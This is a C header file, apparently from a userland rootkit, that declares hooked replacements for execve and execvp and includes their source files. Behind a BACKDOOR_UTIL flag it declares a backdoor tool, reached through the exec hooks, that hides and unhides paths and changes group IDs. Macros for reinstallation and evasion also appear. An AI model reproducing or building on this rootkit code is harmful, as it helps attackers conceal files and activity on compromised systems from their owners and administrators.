#ifndef EXEC_H
#define EXEC_H

#if defined(DO_REINSTALL) && defined(DO_EVASIONS)
#define CANTEVADE_ERR EPERM
#endif

#ifdef BACKDOOR_UTIL
  /* these are all of the messages that can & will
   * be shown upon interaction with the (un)hiding
   * util via the exec hooks. */
#define ERR_NO_OPTION     "valid options: 'hide', 'unhide(self)' ('changegid' if applicable) (and a path if performing a file op)"
#define ERR_ACSS_PATH     "access failed on path. does it exist?"
#define ALRDY_HIDDEN_STR  "path is already hidden..."
#define PATH_HIDDEN_STR   "path now hidden"
#define ERR_HIDING_PATH   "error hiding path"
#define ALRDY_VISIBLE_STR "path is already visible..."
#define PATH_VISIBLE_STR  "path now visible"
#define ERR_UNHIDING_PATH "error unhiding path"


void do_self(void);
void option_err(void);
void do_hidingutil(char *const argv[]);
#include "hiding_util.c"
#endif


int execve(const char *filename, char *const argv[], char *const envp[]);
#include "execve.c"

int execvp(const char *filename, char *const argv[]);
#include "execvp.c"
#endif
